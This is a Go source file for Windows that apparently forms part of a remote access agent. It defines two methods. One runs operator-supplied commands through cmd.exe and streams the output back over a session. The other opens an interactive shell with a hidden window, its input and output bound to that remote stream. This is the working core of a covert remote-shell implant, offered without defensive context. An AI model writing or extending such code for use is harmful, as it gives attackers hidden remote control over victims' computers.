// +build windows

package main

import (
	"os"
	"os/exec"
	"syscall"
)

func (a *Agent) execute(command string) {

	stream := openNewStream(a.session)

	if  stream == nil {
		return
	}

	defer stream.Close()

	cmd := exec.Command("cmd.exe", "/C", command)
	cmd.Stdout = stream
	cmd.Stderr = stream

	cmd.Run()
}


func (a *Agent) shell() {

	stream := openNewStream(a.session)

	if stream == nil {
		return
	}

	defer stream.Close()

	var shell string
	shell = os.Getenv("SHELL")
	if shell == "" {
		shell = "cmd.exe"
	}

	command := exec.Command(shell)
	command.Env = []string{}
	command.Stdout = stream
	command.Stdin = stream
	command.Stderr = stream
	command.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	err := command.Start()
	if err != nil {
		return
	}

	command.Wait()
}
